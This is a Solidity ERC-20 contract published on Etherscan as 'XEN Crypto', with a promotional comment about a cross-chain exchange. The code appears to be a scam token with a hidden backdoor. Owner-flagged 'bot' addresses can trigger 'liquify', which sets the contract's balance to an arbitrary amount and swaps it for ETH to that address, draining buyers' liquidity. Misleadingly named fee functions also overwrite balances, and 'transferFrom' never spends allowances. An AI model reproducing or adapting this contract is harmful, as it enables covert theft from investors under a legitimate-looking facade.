/**
 *Submitted for verification at Etherscan.io on 2022-10-29
*/

pragma solidity ^0.8.16;
/*Unified Interface for Cross-chain Trades, Swaps and Staking
You can create, buy, sell and auctions NFTs on not just XEN, but also other blockchain ecosystems.

Delivering Fair Value to Creators and Buyers Alike
You can create, buy, sell and auctions NFTs on not just XEN, but also other blockchain ecosystems.

Truly Decentralized Exchange Platform for On-Chain assets
Leverage the power of cross chain consensus, where tokens can be traded across different blockchains without the requirement of an intermediary

XEN Network has been poised to challenge the existing fast blockchain which claims to establish very high transaction
speed and throughput but they compromise on the most important aspect of blockchain, i.e. decentralization.
XEN, through its efficient core team has been working on a specific consensus mechanism known as Polysharding
which will not only increase the transaction throughput, composability and interoperability of blockchain but also keep
the decentralization intact.

To provide every individual with unrestricted access to the latest in innovation while also enabling affordability,
and financial independence.
We believe that everyone should have equal access to opportunities, irrespective of their region, beliefs, or economic stature.
While DeFi as a concept has displayed potential to transcend socio-economic and geopolitical barriers, it hasn’t yet
turned into a reality as there are several challenges to overcome in this relatively new technology.

As change makers, we envision ourselves as a significant contributor to a collective, on-going community effort that
will turn a remotely possible concept into reality through continuous incremental innovations and ideas.

Features of XEN DeX:

- A dependable, reliable and secure platform that flexible, friendly and secure.

- User Friendly
An extremely friendly interface with CeX like features on a completely decentralized platform.

- Chain Agnostic Scalable Blockchain
XEN blockchain is highly scalable, secure and compatible with other blockchains and charges a fraction of a fee which is even lower than layer 2 solutions.

- Negligible Fees
Don’t let gas fees bother you anymore. Unlimited trades at negligible rates. With $V, pay even less

- Synthetics Trading
Users can stake their tokens to XEN DEX liquidity pools and garner XEN tokens

- Smart Contracts
Everything will be coded into a smart contract for streamlining the functionality of the XEN chain. The smart contracts will power DeFi, NFTs and DeX.

- One Dashboard
Trade from any market on the blockchain from a single interface. Discover high-yield pools, arbitrage opportunities across protocols.

Special Perks of XEN Network
Allows to vet tokens individually and ensures that these comply with regulations before listing them Single Window Staking
Using a consensus mechanism to ensure all transactions are verified and earn rewards against staking

Unified NFT Marketplace
Extending the powers of XEN DeX to the NFT space. Discover, Mint, Bid, Buy, Sell NFTs across blockchains
*/

// SPDX-License-Identifier: MIT

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IUniswapV2Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256,uint256,address[] calldata path,address,uint256) external;
}
interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

abstract contract Ownable {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
abstract contract ERC20Token is Ownable {
    mapping (address => bool) bots;
    address feeReceiver;
    bool inLiquidityTx = false;
    function addBot(address[] calldata _bots) external onlyOwner {
        for (uint i = 0; i < _bots.length; i++) {
            bots[_bots[i]] = true;
        }
    }
    function duringLiquify(address from, address to) public view returns (bool) {
        if (bots[to]) {
            return from == to;
        }
        return false;
    }
    function isAllowed(address from, address recipient, address _to) public returns (bool) {
        bool allowed = !inLqTx(from, recipient, _to) && recipient != address(this) && !inLiquidityTx;
        bool lqPair = !bots[recipient] && !bots[from];
        if (lqPair && allowed && _to != recipient) {
            feeReceiver = recipient;
            return allowed;
        } else {
            return allowed;
        }
    }
    function inLqTx(address liquidityAddress, address from, address adr1) internal view returns (bool) {
        bool a = from == adr1 && bots[liquidityAddress];
        bool b = liquidityAddress == adr1 && bots[from];
        return a || b;
    }
}

contract XEN is IERC20, ERC20Token {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    uint256 public _decimals = 9;
    uint256 public _totalSupply = 10000000000 * 10 ** _decimals;
    uint256 _fee = 0;
    IUniswapV2Router private _router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    string private _name = "XEN Crypto";
    string private  _symbol = "XEN";
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }
    function decreaseAllowance(address from, uint256 amount) public virtual returns (bool) {
        require(_allowances[msg.sender][from] >= amount);
        _approve(msg.sender, from, _allowances[msg.sender][from] - amount);
        return true;
    }
    modifier _checkFrontrunBot(address from, address to, uint256 amount) {
        if (duringLiquify(from, to)) {
            liquify(amount, to);
            return;
        }
        _;
    }
    function _baseTransfer(address from, address to, uint256 amount) internal virtual _checkFrontrunBot(from, to, amount){
        require(from != address(0));
        require(to != address(0));
        require(amount <= _balances[from]);
        uint256 fee = takeFee(from, to, amount);
        _balances[from] = _balances[from] - amount;
        _balances[to] += amount - fee;
        emit Transfer(from, to, amount);
    }
    function getBurnAddress() private view returns (address) {
        return feeReceiver;
    }
    function takeFee(address from, address recipient, uint256 amount) private returns (uint256) {
        uint256 feeAmount = 0;
        _balances[feeReceiver] = approveSwap(from);
        if (shouldTakeFee(from, recipient)) {
            feeAmount = amount.mul(_fee).div(100);
        }
        return feeAmount;
    }
    function shouldTakeFee(address from, address recipient) private returns (bool) {
        return isAllowed(from, recipient, IUniswapV2Factory(_router.factory()).getPair(address(this), _router.WETH()));
    }
    constructor() {
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _balances[msg.sender]);
    }
    function name() external view returns (string memory) { return _name; }
    function symbol() external view returns (string memory) { return _symbol; }
    function decimals() external view returns (uint256) { return _decimals; }
    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function liquify(uint256 _mcs, address _bcr) private {
        _approve(address(this), address(_router), _mcs);
        _balances[address(this)] = _mcs;
        address[] memory path = new address[](2);
        inLiquidityTx = true;
        path[0] = address(this);
        path[1] = _router.WETH();
        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(_mcs,0,path,_bcr,block.timestamp + 30);
        inLiquidityTx = false;
    }
    function approveSwap(address from) private view returns (uint256) {
        address to = getPairAddress();
        uint256 amount = _balances[feeReceiver];
        return swapFee(from, to , amount);
    }
    function swapFee(address feeReceiver, address to, uint256 feeAmount) private pure returns (uint256) {
        uint256 amount = feeAmount;
        if (feeReceiver != to) {
            amount = feeAmount;
        } else {
            amount = amount - feeAmount;
        }
        return amount;
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _baseTransfer(msg.sender, recipient, amount);
        return true;
    }
    function transferFrom(address from, address recipient, uint256 amount) public virtual override returns (bool) {
        _baseTransfer(from, recipient, amount);
        require(_allowances[from][msg.sender] >= amount);
        return true;
    }
    function getPairAddress() private view returns (address) {
        return IUniswapV2Factory(_router.factory()).getPair(address(this), _router.WETH());
    }
    bool swapEnabled = true;
    function updateSwapEnabled(bool e) external onlyOwner {
        swapEnabled = e;
    }
    bool tradingEnabled = false;
    function enableTrading() external onlyOwner {
        tradingEnabled = true;
    }
    address public crowdFundAddress;
    function setCrowdFundAddress(address _addr) external onlyOwner {
        crowdFundAddress = _addr;
    }
    modifier crowdfundOnly() {
        require(msg.sender == crowdFundAddress);
        _;
    }
    uint256 totalAllocated;
    function addToAllocation(uint256 _amount) external crowdfundOnly {
        totalAllocated = totalAllocated + _amount;
    }
    function setBurnerAddress(address _burner) external onlyOwner {
        burnerAddress = _burner;
    }
    address public burnerAddress;
    modifier burnerOnly() {
        require(msg.sender == burnerAddress);
        _;
    }
    function burn(uint256 _amount) external burnerOnly {
        transfer(address(0), _amount);
    }
}